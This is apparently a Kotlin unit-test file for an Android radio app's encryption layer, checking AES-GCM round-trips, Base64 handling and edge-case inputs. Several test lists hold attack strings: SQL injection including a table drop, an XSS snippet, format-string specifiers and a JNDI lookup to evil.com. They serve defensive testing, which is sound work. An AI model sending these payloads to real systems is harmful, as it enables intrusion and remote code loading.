package com.opensource.i2pradio.security

import android.util.Base64
import io.mockk.every
import io.mockk.mockkStatic
import io.mockk.unmockkAll
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * Security tests for input validation and edge cases.
 *
 * Test Coverage:
 * 1. Malformed Input Handling
 * 2. Boundary Conditions
 * 3. Injection Prevention
 * 4. Error Information Leakage
 * 5. Resource Exhaustion Prevention
 */
class InputValidationSecurityTest {

    private val GCM_IV_LENGTH = 12
    private val GCM_TAG_LENGTH = 128
    private lateinit var testKey: ByteArray

    @Before
    fun setup() {
        testKey = ByteArray(32)
        SecureRandom().nextBytes(testKey)

        // Mock Android's Base64 class for JVM tests
        mockkStatic(Base64::class)
        every { Base64.encodeToString(any(), any()) } answers {
            java.util.Base64.getEncoder().encodeToString(firstArg<ByteArray>())
        }
        every { Base64.decode(any<String>(), any()) } answers {
            java.util.Base64.getDecoder().decode(firstArg<String>())
        }
    }

    @After
    fun teardown() {
        unmockkAll()
    }

    // ========================================================================
    // Malformed Base64 Input Tests
    // ========================================================================

    @Test
    fun `test invalid Base64 characters are rejected`() {
        val invalidStrings = listOf(
            "!!!not-base64!!!",
            "has spaces in it",
            "has\ttabs",
            "has\nnewlines",
            "<script>alert(1)</script>",
            "' OR '1'='1",  // SQL injection attempt
            "${'\u0000'}null\u0000bytes"
        )

        for (invalid in invalidStrings) {
            try {
                java.util.Base64.getDecoder().decode(invalid)
                fail("Should reject invalid Base64: $invalid")
            } catch (e: IllegalArgumentException) {
                // Expected
            }
        }
    }

    @Test
    fun `test truncated Base64 is rejected`() {
        // Valid Base64 but incomplete for expected format
        val truncated = "AAAA" // Too short to be valid ciphertext

        val decoded = java.util.Base64.getDecoder().decode(truncated)
        assertTrue("Truncated data should be too short for IV + tag",
            decoded.size < GCM_IV_LENGTH + 16)
    }

    @Test
    fun `test Base64 padding variations`() {
        // Test various padding scenarios
        val testData = "test"
        val encoded = java.util.Base64.getEncoder().encodeToString(testData.toByteArray())

        // Valid with standard padding
        val decoded = java.util.Base64.getDecoder().decode(encoded)
        assertEquals("Should decode correctly", testData, String(decoded))

        // Invalid padding should throw
        try {
            java.util.Base64.getDecoder().decode(encoded + "====") // Extra padding
            // Some decoders are lenient with padding
        } catch (e: IllegalArgumentException) {
            // Expected for strict decoders
        }
    }

    // ========================================================================
    // Password Boundary Tests
    // ========================================================================

    @Test
    fun `test zero-length password`() {
        val key = SecretKeySpec(testKey, "AES")
        val plaintext = ""

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(GCM_IV_LENGTH)
        SecureRandom().nextBytes(iv)

        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val ciphertext = cipher.doFinal(plaintext.toByteArray())

        // Empty plaintext still produces auth tag
        assertTrue("Empty plaintext should produce auth tag",
            ciphertext.size >= 16) // 128-bit tag

        // Should decrypt back to empty
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val decrypted = String(cipher.doFinal(ciphertext))
        assertEquals("Should decrypt to empty string", "", decrypted)
    }

    @Test
    fun `test single byte password`() {
        val key = SecretKeySpec(testKey, "AES")
        val plaintext = "a"

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(GCM_IV_LENGTH)
        SecureRandom().nextBytes(iv)

        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val ciphertext = cipher.doFinal(plaintext.toByteArray())

        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val decrypted = String(cipher.doFinal(ciphertext))

        assertEquals("Single byte should encrypt/decrypt correctly", "a", decrypted)
    }

    @Test
    fun `test password at block boundary`() {
        // AES block size is 16 bytes, test at boundary
        val key = SecretKeySpec(testKey, "AES")
        val plaintexts = listOf(
            "a".repeat(15),  // One less than block
            "a".repeat(16),  // Exactly one block
            "a".repeat(17),  // One more than block
            "a".repeat(31),  // One less than two blocks
            "a".repeat(32),  // Exactly two blocks
            "a".repeat(33)   // One more than two blocks
        )

        for (plaintext in plaintexts) {
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val ciphertext = cipher.doFinal(plaintext.toByteArray())

            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val decrypted = String(cipher.doFinal(ciphertext))

            assertEquals("Block boundary test for length ${plaintext.length}",
                plaintext, decrypted)
        }
    }

    // ========================================================================
    // Unicode and Encoding Tests
    // ========================================================================

    @Test
    fun `test multi-byte UTF-8 characters`() {
        val key = SecretKeySpec(testKey, "AES")

        val unicodePasswords = listOf(
            "日本語",      // Japanese (3 bytes per char)
            "한국어",      // Korean
            "العربية",    // Arabic (RTL)
            "हिंदी",        // Hindi
            "emoji🔐🔑",  // Emoji (4 bytes per char)
            "mixed日本語andEnglish",
            "\uD83D\uDD10" // Surrogate pair (locked key emoji)
        )

        for (password in unicodePasswords) {
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val ciphertext = cipher.doFinal(password.toByteArray(Charsets.UTF_8))

            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val decrypted = String(cipher.doFinal(ciphertext), Charsets.UTF_8)

            assertEquals("Unicode password should round-trip: $password",
                password, decrypted)
        }
    }

    @Test
    fun `test control characters in password`() {
        val key = SecretKeySpec(testKey, "AES")

        val controlChars = listOf(
            "test\u0000null",    // Null byte
            "test\u0001soh",     // Start of heading
            "test\u007Fdel",     // Delete
            "test\ttab",         // Tab
            "test\nnewline",     // Newline
            "test\rcarriage",    // Carriage return
            "test\u001Bescape"   // Escape
        )

        for (password in controlChars) {
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val ciphertext = cipher.doFinal(password.toByteArray(Charsets.UTF_8))

            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val decrypted = String(cipher.doFinal(ciphertext), Charsets.UTF_8)

            assertEquals("Control character password should round-trip",
                password, decrypted)
        }
    }

    // ========================================================================
    // Format String and Injection Tests
    // ========================================================================

    @Test
    fun `test format string characters in password`() {
        val key = SecretKeySpec(testKey, "AES")

        val formatStrings = listOf(
            "%s%s%s%s%s",
            "%n%n%n",
            "%x%x%x%x",
            "\${{password}}",
            "{{7*7}}",
            "\${jndi:ldap://evil.com/a}",
            "<!--test-->",
            "<![CDATA[test]]>"
        )

        for (password in formatStrings) {
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val ciphertext = cipher.doFinal(password.toByteArray())

            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val decrypted = String(cipher.doFinal(ciphertext))

            assertEquals("Format string password should be preserved exactly",
                password, decrypted)
        }
    }

    @Test
    fun `test SQL injection patterns in password`() {
        val key = SecretKeySpec(testKey, "AES")

        val sqlInjections = listOf(
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "1; SELECT * FROM passwords",
            "admin'--",
            "' UNION SELECT * FROM users--"
        )

        for (password in sqlInjections) {
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val ciphertext = cipher.doFinal(password.toByteArray())

            cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
            val decrypted = String(cipher.doFinal(ciphertext))

            // Password should be encrypted as-is, no SQL processing
            assertEquals("SQL injection pattern should be preserved",
                password, decrypted)
        }
    }

    // ========================================================================
    // IV and Nonce Validation Tests
    // ========================================================================

    @Test
    fun `test zero IV is rejected for GCM in practice`() {
        val key = SecretKeySpec(testKey, "AES")
        val zeroIv = ByteArray(GCM_IV_LENGTH) // All zeros

        // While technically valid, a zero IV is a security concern
        // The implementation should use random IVs
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, zeroIv))

        // This works but should never happen in practice
        val ciphertext = cipher.doFinal("test".toByteArray())
        assertNotNull("Zero IV technically works but is insecure", ciphertext)
    }

    @Test
    fun `test short IV is rejected`() {
        val key = SecretKeySpec(testKey, "AES")
        val shortIv = ByteArray(8) // Should be 12 for GCM
        SecureRandom().nextBytes(shortIv)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")

        // GCM recommends 12-byte IV, but accepts others
        // Some implementations may reject non-12-byte IVs
        try {
            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, shortIv))
            // If it works, it works (GCM is flexible with IV length)
        } catch (e: Exception) {
            // Some implementations reject non-standard IV lengths
        }
    }

    // ========================================================================
    // Error Message Security Tests
    // ========================================================================

    @Test
    fun `test AEADBadTagException does not leak plaintext`() {
        val key = SecretKeySpec(testKey, "AES")
        val wrongKey = SecretKeySpec(ByteArray(32).also { SecureRandom().nextBytes(it) }, "AES")

        // Encrypt with correct key
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(GCM_IV_LENGTH)
        SecureRandom().nextBytes(iv)
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val ciphertext = cipher.doFinal("sensitive data".toByteArray())

        // Try to decrypt with wrong key
        cipher.init(Cipher.DECRYPT_MODE, wrongKey, GCMParameterSpec(GCM_TAG_LENGTH, iv))

        try {
            cipher.doFinal(ciphertext)
            fail("Should throw AEADBadTagException")
        } catch (e: javax.crypto.AEADBadTagException) {
            // Error message should not contain plaintext
            assertFalse("Error should not contain plaintext",
                e.message?.contains("sensitive") == true)
        }
    }

    @Test
    fun `test IllegalArgumentException does not leak sensitive info`() {
        // Test that Base64 decode errors don't leak context
        try {
            java.util.Base64.getDecoder().decode("!!!invalid!!!")
            fail("Should throw")
        } catch (e: IllegalArgumentException) {
            // Message should be about format, not about password content
            assertTrue("Error should be about format",
                e.message?.contains("Illegal") == true ||
                        e.message?.contains("illegal") == true ||
                        e.message?.contains("Invalid") == true)
        }
    }

    // ========================================================================
    // Resource Exhaustion Prevention Tests
    // ========================================================================

    @Test
    fun `test large input doesn't cause memory issues`() {
        val key = SecretKeySpec(testKey, "AES")

        // 1MB should be fine
        val largeInput = ByteArray(1_000_000)
        SecureRandom().nextBytes(largeInput)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(GCM_IV_LENGTH)
        SecureRandom().nextBytes(iv)

        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val ciphertext = cipher.doFinal(largeInput)

        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
        val decrypted = cipher.doFinal(ciphertext)

        assertArrayEquals("Large input should round-trip correctly",
            largeInput, decrypted)
    }

    @Test
    fun `test concurrent encryption operations are thread-safe`() {
        val key = SecretKeySpec(testKey, "AES")
        val results = java.util.concurrent.ConcurrentHashMap<Int, Boolean>()

        val threads = (1..10).map { threadId ->
            Thread {
                try {
                    repeat(100) {
                        val plaintext = "thread$threadId-$it"
                        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                        val iv = ByteArray(GCM_IV_LENGTH)
                        SecureRandom().nextBytes(iv)

                        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
                        val ciphertext = cipher.doFinal(plaintext.toByteArray())

                        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))
                        val decrypted = String(cipher.doFinal(ciphertext))

                        if (decrypted != plaintext) {
                            results[threadId] = false
                            return@Thread
                        }
                    }
                    results[threadId] = true
                } catch (e: Exception) {
                    results[threadId] = false
                }
            }
        }

        threads.forEach { it.start() }
        threads.forEach { it.join() }

        assertTrue("All threads should succeed",
            results.values.all { it })
    }
}
